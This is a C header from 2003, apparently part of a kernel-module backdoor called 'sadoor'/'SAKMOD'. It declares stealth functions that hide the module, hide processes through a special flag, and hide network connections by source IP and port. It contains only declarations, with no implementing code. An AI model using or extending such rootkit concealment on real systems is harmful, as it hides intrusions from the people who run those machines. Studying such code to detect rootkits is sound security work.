/*
 *  File: stealth.h
 *  Author: Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  Description: Stealth options header file
 *  Version: 1.0
 *  Date: Thu Jul  3 15:48:22 CEST 2003
 *
 *  Copyright (c) 2003 Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  All rights reserved, all wrongs reversed.
 *
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions
 *  are met:
 *
 *  1. Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *  2. Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *  3. The name of author may not be used to endorse or promote products
 *     derived from this software without specific prior written permission.
 *
 *  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 *  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 *  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 *  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 *  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 *  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 *  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 *  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 *  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 *  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#ifndef _STEALTH_H
#define _STEALTH_H

#include "sadoor.h"

/* New process flag telling that the process is hidden */
#define SAKMOD_HIDDEN_PROC_FLAG     0x80000000

/* hide_module.c */
extern void hide_module(void);

/* hide_procs.c */
extern void hide_procs(void);
extern void hide_procs_restore(void);

/* The double linked list of hidden connections */
struct hidden_conn {
    uint32_t srcip;
    uint16_t srcport;

    struct hidden_conn *prev;
    struct hidden_conn *next;
};


/* hide_conns.c */
extern void hide_conns(void);
extern void hide_conns_restore(void);
extern void hide_conns_addconn(uint32_t, uint16_t);
extern void hide_conns_delconn(uint32_t, uint16_t);
#ifdef SAKMOD_HIDE_PROCS
extern int hide_conns_sysctl(struct proc *, void *, register_t *);
#endif /* SAKMOD_HIDE_PROCS */

#endif /* _STEALTH_H */
